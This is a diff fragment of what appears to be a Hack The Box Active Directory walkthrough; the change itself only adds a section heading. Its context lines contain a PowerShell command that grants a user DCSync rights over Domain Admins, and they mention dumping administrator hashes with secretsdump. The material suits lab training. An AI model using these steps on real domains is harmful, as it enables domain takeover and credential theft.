@@ -541,6 +541,15 @@ Ive already added sh1n0bi to the "Exchange Windows Permissions" group so don't n
 $pass = ConvertTo-SecureString -AsPlainText $Password -Force;$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username,$pass;Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'sh1n0bi' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
 ```
 
+
+
+<hr width="400" size="10">
+
+
+
+<h3>Secretsdump + Psexec</h3>
+
+
 Now we can use Impacket's `secretsdump.py` to get the Admin hashes.
 
 
